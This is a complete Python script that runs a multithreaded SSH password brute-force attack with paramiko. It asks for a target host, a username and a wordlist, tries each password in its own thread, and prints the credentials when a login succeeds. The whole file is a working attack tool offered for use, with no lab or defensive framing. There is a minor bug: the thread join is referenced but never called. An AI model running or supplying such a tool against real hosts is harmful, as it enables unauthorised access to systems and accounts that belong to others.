import paramiko
import os
import sys
import socket
import threading
import time

stop_flag = 0

def ssh_connect(password, code=0):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print("[+] Found Password: " + str(password) + ", For Account: " + str(username))
    except:
        print("[-] Incorrect Login: " + str(password))
    ssh.close()

host = str(input("[+] Target address: "))
username = str(input("[+] SSH Username: "))
wordlist = str(input("[+] Passwords file path: "))
print('\n')

if os.path.exists(wordlist) == False:
    print("[!!] Passwords file doesn't exists!")
    sys.exit(1)

print("[ *** Starting SSH Bruteforce on: " + str(host) + " With account: " + str(username) + " *** ]")

with open(wordlist, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password, ))
        t.start()
        time.sleep(0.5)